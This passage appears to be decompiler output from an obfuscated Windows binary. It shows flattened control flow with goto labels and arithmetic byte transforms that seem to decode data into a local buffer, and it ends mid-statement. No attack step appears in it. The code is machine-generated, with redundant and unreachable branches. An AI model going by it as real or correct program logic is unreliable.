LAB_140011b82:
  bVar5 = (char)uVar11 + 0x7c;
  *(byte *)((longlong)&local_2b8 + uVar11) = bVar2 + (bVar2 & bVar5) * -2 + -100 + bVar5;
  uVar14 = uVar14 + 1;
  lVar18 = uVar11 + (-1 - uVar14);
  uVar11 = lVar18 + (&bStack_2b9)[lVar18 + 1] + uVar13 + 1;
  goto LAB_1400110e3;
code_r0x000140012755:
  bVar15 = bVar2 + (bVar2 & cVar10 + 0xa3U) * -2 + -0x75 + cVar10 + 0xa3U;
LAB_1400127b0:
  if (uVar11 < uVar13) {
    in_stack_00f588af = in_stack_0151570c;
    goto LAB_140013217;
  }
  if (uVar14 < uVar13 + 0x40) {
    bVar15 = cVar10 + (cVar10 + 0x5fU & bVar2) * -2 + -0x3a + bVar2;
  }
  else {
    if (uVar14 == uVar13 + 1) {
      bVar15 = cVar10 + 0xa5;
      cVar16 = '\x11';
      goto LAB_140013086;
    }
    if (uVar14 == uVar13 + 2) {
      bVar15 = cVar10 + (cVar10 + 0x31U & bVar2) * -2 + -0x26 + bVar2;
      goto LAB_140012733;
    }
    if (uVar14 == uVar13 + 3) {
      bVar15 = cVar10 + (cVar10 + 0xbdU & bVar2) * -2 + -0x6e + bVar2;
      goto LAB_140013114;
    }
    if (uVar14 == uVar13 + 6) {
      bVar15 = ('%' - (cVar10 + 0x49U & bVar2)) * '\x02' + cVar10 + bVar2;
      goto LAB_140013146;
    }
    if (uVar14 == uVar13 + 2) {
      bVar15 = cVar10 + (cVar10 + 0x8fU & bVar2) * -2 + -0x5a + bVar2;
      goto LAB_14001316b;
    }
  }
  while (uVar7 = uVar13, uVar11 < uVar13 + uVar14) {
    while( true ) {
      uVar13 = uVar7;
      if (uVar14 == uVar13 + 0x61) {
        cVar16 = cVar10 + (cVar10 + 10U & bVar2) * -2 + -0x3c;
        goto LAB_140013092;
      }
      if (uVar14 == uVar13 + 1) {
        bVar15 = cVar10 + 0x50;
        cVar16 = '\x10';
        goto LAB_1400130c5;
      }
      if (uVar14 == uVar13 + 0x7a) {
        bVar15 = ('>' - (cVar10 + 0x96U & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_140012733;
      }
      if (uVar14 == uVar13 + 2) {
        bVar15 = cVar10 + (cVar10 - 0x24U & bVar2) * -2 + -0x28 + bVar2;
        goto LAB_1400130f8;
      }
      if (uVar14 == uVar13 + 0x41) {
        bVar15 = ('\x1a' - (cVar10 + 0x22U & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_140013114;
      }
      if (uVar14 == uVar13 + 0x400) {
        bVar15 = cVar10 + (cVar10 + 0x68U & bVar2) * -2 + -0x70 + bVar2;
        goto LAB_140013117;
      }
      if (uVar14 == uVar13 + 0x5a) {
        bVar15 = cVar10 + (cVar10 + 0xaeU & bVar2) * -2 + -0x14 + bVar2;
        goto LAB_140013146;
      }
      if (uVar14 == uVar13 + 0x1000) {
        bVar15 = ('$' - (cVar10 - 0xcU & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_14001316b;
      }
      if (uVar14 == uVar13 + 0x80) {
        bVar15 = cVar10 + (cVar10 + 0x3aU & bVar2) * -2 + -0x5c + bVar2;
        uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x80] + uVar13 + 1;
        goto LAB_140012733;
      }
      uVar14 = uVar13 + 0x20;
      uVar7 = uVar13 + 0x220;
      if (uVar14 < uVar13 + 0x228) {
        bVar15 = bVar2 + cVar10 + (cVar10 + 0x69U & bVar2) * -2 + 0x8a;
        goto LAB_140012720;
      }
      if (uVar14 < uVar13 + 0x223) {
        bVar15 = (bVar2 + cVar10 + (cVar10 + 0xafU & bVar2) * -2) - 0x1a;
        goto LAB_140012730;
      }
      if (uVar14 < uVar13 + 0x229) {
        bVar15 = ('!' - (cVar10 - 0xbU & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar13 = uVar7;
        goto LAB_140012743;
      }
      if (uVar14 < uVar13 + 0x224) {
        bVar15 = cVar10 + (cVar10 + 0x3bU & bVar2) * -2 + -0x62 + bVar2;
        uVar13 = uVar7;
        goto LAB_1400127b0;
      }
      if (uVar14 < uVar13 + 0x24a) break;
      if (uVar14 < uVar13 + 0x225) {
        bVar15 = cVar10 - 0x39;
        cVar16 = '+';
        uVar13 = uVar7;
        goto LAB_140012beb;
      }
      if (uVar14 < uVar13 + 0x221) {
        cVar16 = cVar10 + (cVar10 + 0xdU & bVar2) * -2 + -0x4e;
        uVar13 = uVar7;
        goto LAB_140012b99;
      }
      if (uVar14 < uVar13 + 0x226) {
        bVar15 = ('\a' - (cVar10 + 0x53U & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar13 = uVar7;
        goto LAB_140012b60;
      }
      if (uVar14 < uVar13 + 0x222) {
        bVar15 = ('5' - (cVar10 + 0x99U & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar13 = uVar7;
        goto LAB_140012b3b;
      }
      if (uVar13 + 0x261 <= uVar14) {
        uVar7 = uVar13 + 0x260;
        uVar17 = uVar13 + 0x263;
        uVar14 = uVar7;
        if (uVar13 + 0x26d < uVar7) {
          bVar15 = ('(' - (cVar10 - 0x38U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x80] + uVar17 + 1;
          uVar13 = uVar17;
          goto LAB_140012733;
        }
        if (uVar13 + 0x2a5 < uVar7) {
          bVar15 = cVar10 + (cVar10 + 0xeU & bVar2) * -2 + -0x54 + bVar2;
          uVar13 = uVar17;
          goto LAB_14001316b;
        }
        if (uVar13 + 0x273 < uVar7) {
          bVar15 = ('\x04' - (cVar10 + 0x54U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar17;
          goto LAB_140013146;
        }
        uVar14 = uVar13 + 0x2c7;
        if (uVar14 < uVar7) {
          bVar15 = ('2' - (cVar10 + 0x9aU & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar14 = uVar7;
          uVar13 = uVar17;
          goto LAB_140013117;
        }
        if (uVar13 + 0x283 < uVar7) {
          bVar15 = cVar10 + (cVar10 - 0x20U & bVar2) * -2 + -0x40 + bVar2;
          uVar14 = uVar7;
          uVar13 = uVar17;
          goto LAB_140013114;
        }
        if (uVar13 + 0x26b < uVar7) {
          bVar15 = ('\x0e' - (cVar10 + 0x26U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar14 = uVar7;
          uVar13 = uVar17;
          goto LAB_1400130f8;
        }
        if (uVar13 + 0x28b < uVar7) {
          bVar15 = ('<' - (cVar10 + 0x6cU & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar14 = uVar7;
          uVar13 = uVar17;
          goto LAB_140012733;
        }
        if (uVar13 + 0x26c < uVar7) {
          bVar15 = cVar10 + (cVar10 + 0xb2U & bVar2) * -2 + -0x2c + bVar2;
          uVar14 = uVar7;
          uVar13 = uVar13 + 0x264;
          goto LAB_140012733;
        }
        if (uVar13 + 0x267 < uVar7) {
          bVar15 = cVar10 - 8;
          cVar16 = '\x18';
          uVar14 = uVar7;
          uVar13 = uVar17;
          goto LAB_140013086;
        }
        uVar7 = uVar13 + 0x2cc;
      }
    }
    bVar15 = cVar10 + (cVar10 + 0x81U & bVar2) * -2 + -6 + bVar2;
    uVar13 = uVar7;
  }
  if (uVar13 + 10 <= uVar14) {
    if (uVar14 == uVar13 + 1) {
      bVar15 = cVar10 + (cVar10 + 0xbeU & bVar2) * -2 + -0x74 + bVar2;
      uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x80] + uVar13 + 1;
    }
    else {
      if (uVar14 == uVar13 + 3) {
        bVar15 = ('\"' - (cVar10 + 0x4aU & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_140013146;
      }
      if (uVar14 == uVar13 + 2) {
        bVar15 = cVar10 + (cVar10 + 0x90U & bVar2) * -2 + -0x60 + bVar2;
LAB_140013117:
        uVar11 = uVar11 - bVar15;
      }
      else {
        if (uVar14 != uVar13 + 7) {
          if (uVar14 == uVar13 + 8) {
            bVar15 = cVar10 - 0x12;
            cVar16 = '6';
            goto LAB_140013086;
          }
          goto LAB_140012bf7;
        }
        bVar15 = cVar10 + (cVar10 + 0x62U & bVar2) * -2 + -0x4c + bVar2;
      }
    }
    goto LAB_140012733;
  }
  bVar15 = cVar10 + 0xa3;
  cVar16 = '\x17';
LAB_140012beb:
  bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_140012bf7:
  if (uVar13 + uVar14 == 100) {
    bVar15 = ('\x06' - (cVar10 + 0x7eU & bVar2)) * '\x02' + cVar10;
LAB_140013146:
    bVar5 = cVar10 + 0x21U + (cVar10 + 0x21U & bVar2) * -2 + '\x19' + bVar2;
    local_1f8[uVar11 - 0x80] = bVar5;
    uVar11 = uVar11 - ((ulonglong)bVar5 + uVar13 + 1);
    uVar13 = uVar13 + 1;
  }
  else {
    if (uVar14 <= uVar13 + 5) {
      if (uVar14 == uVar13 + 1) {
        bVar15 = cVar10 + 0x1d;
        cVar16 = ')';
        goto LAB_140013086;
      }
      if (uVar14 == uVar13 + 3) {
        bVar15 = ('\x05' - (cVar10 + 0xa9U & bVar2)) * '\x02' + cVar10 + bVar2;
      }
      else {
        if (uVar14 == uVar13 + 2) {
          bVar15 = ('3' - (cVar10 - 0x11U & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_1400130f8;
        }
        if (uVar14 == uVar13 + 4) {
          bVar15 = cVar10 + (cVar10 + 0x35U & bVar2) * -2 + -0x3e + bVar2;
          goto LAB_140013114;
        }
        if (uVar14 == uVar13 + 2) {
          bVar15 = ('=' - (cVar10 - 0x3fU & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_140013146;
        }
        if (uVar14 != uVar13 + 8) goto LAB_140012b9c;
        bVar15 = ('\x19' - (cVar10 + 0x4dU & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x80] + uVar13 + 1;
      }
      goto LAB_140012733;
    }
    cVar16 = cVar10 + (cVar10 - 0x29U & bVar2) * -2 + -10;
LAB_140012b99:
    bVar15 = cVar16 + bVar2;
LAB_140012b9c:
    if (uVar14 != 0) {
      bVar15 = cVar10 + (cVar10 + 0x38U & bVar2) * -2 + -0x50 + bVar2 * '\x02';
      goto LAB_1400130f8;
    }
    if (uVar13 == 0xffffffffffffffff) {
      bVar15 = ('\f' - (cVar10 + 0x7cU & bVar2)) * '\x02' + cVar10 + bVar2;
      uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x80];
      goto LAB_140012733;
    }
    if (uVar13 != 0xfffffffffffffffe) {
      if (uVar13 == 0xfffffffffffffffe) {
        bVar15 = cVar10 + (cVar10 + 8U & bVar2) * -2 + -0x30 + bVar2;
        uVar14 = 0;
        goto LAB_140013146;
      }
      if (uVar13 == 0xfffffffffffffffd) {
        bVar15 = ('\x16' - (cVar10 + 0x4eU & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_140013117;
      }
      if (uVar13 == 0xfffffffffffffff9) {
        bVar15 = (' ' - (cVar10 + 0x20U & bVar2)) * '\x02' + cVar10 + bVar2;
      }
      else {
        if (uVar13 == 0xfffffffffffffff7) {
          cVar16 = cVar10 + (cVar10 + 0xacU & bVar2) * -2 + -8;
          goto LAB_140013092;
        }
LAB_140012b60:
        if (2 < uVar13) {
          bVar15 = (cVar10 + (cVar10 - 0xeU & bVar2) * -2 + bVar2) * '\x02' + 0xa8;
          goto LAB_140013095;
        }
LAB_140012b3b:
        local_1f8[uVar11 - 0x80] = bVar15;
        uVar11 = uVar11 + 1;
      }
      goto LAB_140012733;
    }
    bVar15 = (':' - (cVar10 - 0x3eU & bVar2)) * '\x02' + cVar10 + bVar2;
    uVar14 = 0;
  }
LAB_14001316b:
  bVar5 = (char)uVar11 - 0x3c;
  local_1f8[uVar11 - 0x80] = bVar5 + (bVar5 & bVar2) * -2 + -0x5c + bVar2;
  lVar18 = uVar11 + (-1 - (uVar14 + 1));
  uVar11 = lVar18 + (&bStack_279)[lVar18 + 1] + uVar13 + 1;
  uVar14 = uVar14 + 1;
  goto LAB_140012733;
code_r0x000140013d95:
  bVar15 = cVar10 + 0x3eU + (cVar10 + 0x3eU & bVar2) * -2 + 'N' + bVar2;
LAB_140013df0:
  if (uVar11 < uVar13) {
    in_stack_008449ae = in_stack_01455f70;
    goto LAB_1400147ed;
  }
  if (uVar7 < uVar13 + 8) {
    bVar15 = ('>' - (cVar10 + 0x16U & bVar2)) * '\x02' + cVar10 + bVar2;
  }
  else {
    if (uVar7 == uVar13 + 1) {
      cVar16 = cVar10 + (cVar10 + 0x92U & bVar2) * -2 + -0x6c;
      goto LAB_14001465c;
    }
    if (uVar7 == uVar13 + 2) {
      bVar15 = cVar10 + (cVar10 + 0x8aU & bVar2) * -2 + -0x3c + bVar2;
      goto LAB_140013d73;
    }
    if (uVar7 == uVar13 + 2) {
      bVar15 = cVar10 + (cVar10 + 6U & bVar2) * -2 + -0x24 + bVar2;
      goto LAB_1400146a4;
    }
    if (uVar7 == uVar13 + 3) {
      bVar15 = cVar10 + (cVar10 + 0x82U & bVar2) * -2 + -0xc + bVar2;
      uVar7 = uVar7 + uVar13;
      goto LAB_1400146df;
    }
  }
  while( true ) {
    uVar14 = uVar13;
    if (uVar13 + uVar7 <= uVar11) break;
    while( true ) {
      do {
        uVar13 = uVar14;
        if (uVar7 == uVar13 + 0x10) {
          bVar15 = cVar10 + 0xa4;
          cVar16 = '\x14';
          goto LAB_140014650;
        }
        if (uVar7 == uVar13 + 0x42) {
          bVar15 = (' ' - (cVar10 + 0x20U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar13 + 1;
          goto LAB_140013d73;
        }
        if (uVar7 == uVar13 + 1000) {
          bVar15 = (',' - (cVar10 + 0x9cU & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_140013d73;
        }
        if (uVar7 == uVar13 + 0x7a) {
          bVar15 = ('8' - (cVar10 + 0x18U & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_1400146a4;
        }
        if (uVar7 == uVar13 + 1) {
          bVar15 = cVar10 + (cVar10 + 0x94U & bVar2) * -2 + -0x78 + bVar2;
          uVar7 = uVar7 + uVar13;
          goto LAB_1400146df;
        }
        if (uVar7 == uVar13 + 5) {
          bVar15 = cVar10 + (cVar10 + 0x10U & bVar2) * -2 + -0x60 + bVar2;
          goto LAB_1400146df;
        }
        if (uVar7 == uVar13 + 10) {
          bVar15 = cVar10 + (cVar10 + 0x8cU & bVar2) * -2 + -0x48 + bVar2;
          goto LAB_140014713;
        }
        if (uVar7 == uVar13 + 0x40) {
          bVar15 = cVar10 + (cVar10 + 8U & bVar2) * -2 + -0x30 + bVar2;
          goto LAB_14001473b;
        }
        if (uVar7 == uVar13 + 0x200) {
          bVar15 = cVar10 + (cVar10 + 0x84U & bVar2) * -2 + -0x18 + bVar2;
          uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x40] + uVar13 + 1;
          goto LAB_140013d73;
        }
        uVar14 = uVar13;
      } while (uVar7 == uVar13 + 0x61);
      uVar7 = uVar13 + 0x41;
      uVar14 = uVar13 + 0x6b;
      if (uVar7 < uVar13 + 0x6d) {
        bVar15 = cVar10 + bVar2 + (cVar10 + 0xbaU & bVar2) * -2 + 0xa4;
        goto LAB_140013d60;
      }
      uVar17 = uVar13 + 0x71;
      if (uVar7 < uVar17) {
        bVar15 = cVar10 + bVar2 + (cVar10 + 0x36U & bVar2) * -2 + 0xbc;
        goto LAB_140013d70;
      }
      if (uVar7 < uVar13 + 0x7b) {
        bVar15 = cVar10 + (cVar10 + 0xb2U & bVar2) * -2 + -0x2c + bVar2;
        uVar13 = uVar14;
        goto LAB_140013d83;
      }
      if (uVar7 < uVar13 + 0xad) {
        bVar15 = cVar10 + (cVar10 + 0x2eU & bVar2) * -2 + -0x14 + bVar2;
        uVar13 = uVar14;
        goto LAB_140013df0;
      }
      if (uVar7 < uVar13 + 0x453) break;
      if (uVar7 < uVar13 + 0xe5) {
        cVar16 = ('\x0e' - (cVar10 + 0x26U & bVar2)) * '\x02' + cVar10;
        uVar13 = uVar14;
        goto LAB_14001423f;
      }
      if (uVar7 < uVar13 + 0x6c) {
        bVar15 = cVar10 + 0xa2;
        cVar16 = '\x1a';
        uVar13 = uVar14;
        goto LAB_1400141f1;
      }
      if (uVar7 < uVar13 + 0x70) {
        cVar16 = ('&' - (cVar10 + 0x1eU & bVar2)) * '\x02' + cVar10;
        uVar13 = uVar14;
        goto LAB_1400141ba;
      }
      if (uVar7 < uVar13 + 0x75) {
        bVar15 = ('2' - (cVar10 + 0x9aU & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar13 = uVar14;
        goto LAB_140014198;
      }
      if (uVar13 + 0x6f <= uVar7) {
        uVar14 = uVar13 + 0x7a;
        uVar7 = uVar17;
        if (uVar13 + 0x8a < uVar17) {
          bVar15 = ('\x10' - (cVar10 - 0x30U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x40] + uVar14 + 1;
          uVar13 = uVar14;
          goto LAB_140013d73;
        }
        if (uVar13 + 0xbc < uVar17) {
          bVar15 = ('\x1c' - (cVar10 + 0x4cU & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar14;
          goto LAB_14001473b;
        }
        if (uVar13 + 0x462 < uVar17) {
          bVar15 = ('(' - (cVar10 - 0x38U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar14;
          goto LAB_140014713;
        }
        if (uVar13 + 0xf4 < uVar17) {
          bVar15 = ('4' - (cVar10 + 0x44U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar13 = uVar14;
          goto LAB_1400146df;
        }
        if (uVar13 + 0x7b < uVar17) {
          bVar15 = cVar10 + (cVar10 - 0x40U & bVar2) * -2 + -0x80 + bVar2;
          uVar7 = uVar17 + uVar14;
          uVar13 = uVar14;
          goto LAB_1400146df;
        }
        if (uVar13 + 0x7f < uVar17) {
          bVar15 = cVar10 + (cVar10 + 0x3cU & bVar2) * -2 + -0x68 + bVar2;
          uVar13 = uVar14;
          goto LAB_1400146a4;
        }
        if (uVar13 + 0x84 < uVar17) {
          bVar15 = cVar10 + (cVar10 + 0xb8U & bVar2) * -2 + -0x50 + bVar2;
          uVar13 = uVar14;
          goto LAB_140013d73;
        }
        if (uVar13 + 0xba < uVar17) {
          bVar15 = cVar10 + (cVar10 + 0x34U & bVar2) * -2 + -0x38 + bVar2;
          uVar13 = uVar13 + 0x7b;
          goto LAB_140013d73;
        }
        if (uVar13 + 0x27a < uVar17) {
          cVar16 = cVar10 + (cVar10 + 0xb0U & bVar2) * -2 + -0x20;
          uVar13 = uVar14;
          goto LAB_14001465c;
        }
        if (uVar17 <= uVar13 + 0xdb) {
          uVar7 = uVar13 + 0xbb;
          uVar14 = uVar13 + 0xe5;
        }
      }
    }
    bVar15 = ('\x02' - (cVar10 + 0xaaU & bVar2)) * '\x02' + cVar10 + bVar2;
    uVar13 = uVar14;
  }
  if (uVar13 + 0x7a <= uVar7) {
    if (uVar7 == uVar13 + 1) {
      bVar15 = cVar10 + (cVar10 + 0x2cU & bVar2) * -2 + -8 + bVar2;
      uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x40] + uVar13 + 1;
    }
    else {
      if (uVar7 != uVar13 + 2) {
        if (uVar7 == uVar13 + 3) {
          bVar15 = ('\x14' - (cVar10 + 0x24U & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_140014713;
        }
        if (uVar7 == uVar13 + 5) {
          bVar15 = ('8' - (cVar10 + 0x98U & bVar2)) * '\x02' + cVar10 + bVar2;
          goto LAB_1400146a4;
        }
        if (uVar7 != uVar13 + 7) goto LAB_140014242;
        cVar16 = cVar10 + (cVar10 + 0xcU & bVar2) * -2 + -0x48;
LAB_14001465c:
        bVar15 = cVar16 + bVar2;
        goto LAB_14001465f;
      }
      bVar15 = ('\b' - (cVar10 + 0xa8U & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_14001473b:
      bVar5 = (char)uVar11 + 0x28;
      local_1f8[uVar11 - 0x40] = bVar2 + (bVar2 & bVar5) * -2 + -0x18 + bVar5;
      lVar18 = uVar11 + (-1 - (uVar7 + 1));
      uVar11 = lVar18 + (byte)local_1f8[lVar18 + -0x40] + uVar13 + 1;
      uVar7 = uVar7 + 1;
    }
    goto LAB_140013d73;
  }
  cVar16 = cVar10 + (cVar10 + 0x3eU & bVar2) * -2 + -0x74;
LAB_14001423f:
  bVar15 = cVar16 + bVar2;
LAB_140014242:
  if (uVar13 + uVar7 == 0x10) {
    bVar15 = (cVar10 + (cVar10 + 0xacU & bVar2) * -2) - 8;
    goto LAB_140014713;
  }
  if (uVar13 + 0x28 < uVar7) {
    bVar15 = cVar10 - 0x3a;
    cVar16 = '.';
LAB_1400141f1:
    bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
  }
  else {
    if (uVar7 == uVar13 + 1) {
      bVar15 = cVar10 + 0x42;
      cVar16 = ':';
LAB_140014650:
      cVar16 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10;
      goto LAB_14001465c;
    }
    if (uVar7 == uVar13 + 4) {
      bVar15 = cVar10 + (cVar10 + 0xb6U & bVar2) * -2 + -0x44 + bVar2;
      goto LAB_1400146a4;
    }
    if (uVar7 == uVar13 + 3) {
      bVar15 = cVar10 + (cVar10 + 0xaeU & bVar2) * -2 + -0x14 + bVar2;
      goto LAB_1400146df;
    }
  }
  if (1 < uVar7) {
    bVar15 = cVar10 + (cVar10 + 0x30U & bVar2) * -2 + -0x20 + bVar2 * '\x02';
LAB_1400146a4:
    local_1f8[uVar11 - 0x40] = bVar15 + (bVar2 & cVar10 + 0x6eU) * -2 + -2 + bVar2 + cVar10 + 0x6eU;
    uVar7 = uVar7 + uVar13;
    goto LAB_1400146df;
  }
  if (uVar13 + 4 < uVar7) {
    cVar16 = cVar10 + (cVar10 - 0x24U & bVar2) * -2 + -0x28;
LAB_1400141ba:
    bVar15 = cVar16 + bVar2;
  }
  else {
    if (uVar7 == uVar13 + 1) {
      bVar15 = cVar10 + (cVar10 + 0x58U & bVar2) * -2 + -0x10 + bVar2;
      uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x40] + uVar13 + 1;
      goto LAB_140013d73;
    }
    if (uVar7 == uVar13 + 3) {
      bVar15 = ('\x10' - (cVar10 + 0x50U & bVar2)) * '\x02' + cVar10 + bVar2;
      goto LAB_140014713;
    }
    if (uVar7 == uVar13 + 4) {
      bVar15 = ('4' - (cVar10 - 0x3cU & bVar2)) * '\x02' + cVar10 + bVar2;
      goto LAB_1400146a4;
    }
    if (uVar7 == uVar13 + 2) {
      bVar15 = cVar10 + (cVar10 + 0x40U & bVar2) * -2 + -0x80 + bVar2;
      goto LAB_140013d73;
    }
    if (uVar7 == uVar13 + 2) {
      cVar16 = cVar10 + (cVar10 + 0x38U & bVar2) * -2 + -0x50;
      goto LAB_14001465c;
    }
  }
  if (uVar13 < 0x400) {
LAB_140014198:
    local_1f8[uVar11 - 0x40] = bVar15;
    uVar11 = uVar11 + 1;
  }
  else {
    bVar15 = (cVar10 + (cVar10 + 0xb4U & bVar2) * -2 + bVar2) * '\x02' + 0x90;
LAB_14001465f:
    local_1f8[uVar11 - 0x40] = ('1' - (bVar2 & cVar10 - 0xeU)) * '\x02' + bVar2 + (cVar10 - 0xeU);
    uVar13 = uVar13 + 1;
  }
  goto LAB_140013d73;
code_r0x000140014878:
  bVar15 = bVar2 + (bVar2 & cVar10 + 0xb3U) * -2 + '\x1b' + cVar10 + 0xb3U;
LAB_1400148d2:
  if (uVar11 < uVar13) {
    puVar8 = (undefined4 *)(auStackY_338 + 0x1648d64);
    goto LAB_140015270;
  }
  if (uVar14 < uVar13 + 0x1000) {
    bVar15 = bVar2 + (cVar10 + 0xafU & bVar2) * -2 + -0x1a + cVar10;
  }
  else {
    if (uVar14 == uVar13 + 1) {
      bVar15 = bVar2 + (cVar10 + 0x15U & bVar2) * -2 + -0x7e + cVar10;
      goto LAB_1400150ed;
    }
    if (uVar14 == uVar13 + 3) {
      bVar15 = cVar10 + bVar2 + (cVar10 - 0x1fU & bVar2) * -2 + 0xba;
      goto LAB_140014852;
    }
    if (uVar14 == uVar13 + 5) {
      bVar15 = cVar10 + bVar2 + (cVar10 + 0x13U & bVar2) * -2 + 0x8e;
      goto LAB_14001516b;
    }
  }
  while (uVar7 = uVar13, uVar11 < uVar14 + uVar13) {
    while( true ) {
      do {
        uVar13 = uVar7;
        if (uVar14 == uVar13 + 3) {
          bVar15 = bVar2 + (cVar10 - 0x16U & bVar2) * -2 + -0x7c + cVar10;
          goto LAB_1400150ed;
        }
        if (uVar14 == uVar13 + 1) {
          bVar15 = ('\x10' - (cVar10 + 0x50U & bVar2)) * '\x02' + bVar2 + cVar10;
          uVar13 = uVar13 + 1;
          goto LAB_140014852;
        }
        if (uVar14 == uVar13 + 100) {
          bVar15 = cVar10 + bVar2 + (cVar10 + 0xb6U & bVar2) * -2 + 0xbc;
          goto LAB_140014852;
        }
        if (uVar14 == uVar13 + 0x40) {
          bVar15 = (',' - (cVar10 + 0x1cU & bVar2)) * '\x02' + bVar2 + cVar10;
          goto LAB_14001514b;
        }
        if (uVar14 == uVar13 + 0x20) {
          bVar15 = (cVar10 + bVar2 + (cVar10 + 0x82U & bVar2) * -2) - 0xc;
          goto LAB_140015168;
        }
        if (uVar14 == uVar13 + 0x2a) {
          bVar15 = cVar10 + bVar2 + (cVar10 - 0x18U & bVar2) * -2 + 0x90;
          goto LAB_14001516b;
        }
        if (uVar14 == uVar13 + 0x41) {
          bVar15 = ('\x16' - (cVar10 + 0x4eU & bVar2)) * '\x02' + bVar2 + cVar10;
          goto LAB_140015199;
        }
        if (uVar14 == uVar13 + 0x61) {
          bVar15 = bVar2 + (cVar10 + 0xb4U & bVar2) * -2 + -0x38 + cVar10;
          goto LAB_1400151bc;
        }
        if (uVar14 == uVar13 + 0x10) {
          bVar15 = ('2' - (cVar10 + 0x1aU & bVar2)) * '\x02' + bVar2 + cVar10;
          uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x20] + uVar13 + 1;
          goto LAB_140014852;
        }
        uVar7 = uVar13;
      } while (uVar14 == uVar13 + 9);
      uVar14 = uVar13 + 8;
      uVar7 = uVar13 + 0xe;
      if (uVar14 < uVar13 + 0x6f) {
        bVar15 = ('5' - (cVar10 + 0x99U & bVar2)) * '\x02' + bVar2 + cVar10;
        goto LAB_140014840;
      }
      if (uVar14 < uVar13 + 0x40e) {
        bVar15 = ('\x03' - (cVar10 - 1U & bVar2)) * '\x02' + bVar2 + cVar10;
        goto LAB_140014850;
      }
      if (uVar14 < uVar13 + 0x20e) {
        bVar15 = bVar2 + (cVar10 + 0x65U & bVar2) * -2 + -0x5e + cVar10;
        uVar13 = uVar7;
        goto LAB_140014866;
      }
      if (uVar14 < uVar13 + 0x14) {
        bVar15 = ('\x1f' - (cVar10 - 0x35U & bVar2)) * '\x02' + bVar2 + cVar10;
        uVar13 = uVar7;
        goto LAB_1400148d2;
      }
      if (uVar14 < uVar13 + 0x12) break;
      if (uVar14 < uVar13 + 0x3f6) {
        cVar16 = (';' - (cVar10 + 0x97U & bVar2)) * '\x02' + bVar2;
        uVar13 = uVar7;
        goto LAB_140014d05;
      }
      if (uVar14 < uVar13 + 0x8e) {
        bVar15 = cVar10 - 3;
        cVar16 = '\t';
        uVar13 = uVar7;
        goto LAB_140014cb9;
      }
      if (uVar14 < uVar13 + 0x50) {
        cVar16 = bVar2 + (cVar10 + 99U & bVar2) * -2 + -0x52;
        uVar13 = uVar7;
        goto LAB_140014c88;
      }
      if (uVar14 < uVar13 + 0x11) {
        bVar15 = ('%' - (cVar10 - 0x37U & bVar2)) * '\x02' + bVar2 + cVar10;
        uVar13 = uVar7;
        goto LAB_140014c68;
      }
      if (uVar13 + 0xf <= uVar14) {
        uVar14 = uVar13 + 0x38;
        uVar7 = uVar13 + 0x92;
        if (uVar13 + 0xd4 < uVar14) {
          bVar15 = ('(' - (cVar10 + 0x48U & bVar2)) * '\x02' + bVar2 + cVar10;
          uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x20] + uVar7 + 1;
          uVar13 = uVar7;
          goto LAB_140014852;
        }
        if (uVar13 + 0xba < uVar14) {
          bVar15 = bVar2 + (cVar10 + 0xaeU & bVar2) * -2 + -0x14 + cVar10;
          uVar13 = uVar7;
          goto LAB_1400151bc;
        }
        if (uVar13 + 0xa2 < uVar14) {
          bVar15 = bVar2 + (cVar10 + 0x14U & bVar2) * -2 + -0x78 + cVar10;
          uVar13 = uVar7;
          goto LAB_140015199;
        }
        if (uVar13 + 0xec < uVar14) {
          bVar15 = ('\x12' - (cVar10 + 0x7aU & bVar2)) * '\x02' + bVar2 + cVar10;
          uVar13 = uVar7;
          goto LAB_14001516b;
        }
        if (uVar13 + 0x10c < uVar14) {
          bVar15 = (cVar10 + bVar2 + (cVar10 - 0x20U & bVar2) * -2) - 0x40;
          uVar13 = uVar7;
          goto LAB_140015168;
        }
        if (uVar13 + 0x1092 < uVar14) {
          bVar15 = ('.' - (cVar10 + 0x46U & bVar2)) * '\x02' + bVar2 + cVar10;
          uVar13 = uVar7;
          goto LAB_14001514b;
        }
        if (uVar13 + 0x9c < uVar14) {
          bVar15 = (cVar10 + bVar2 + (cVar10 + 0xacU & bVar2) * -2) - 8;
          uVar13 = uVar7;
          goto LAB_140014852;
        }
        if (uVar13 + 0x9a < uVar14) {
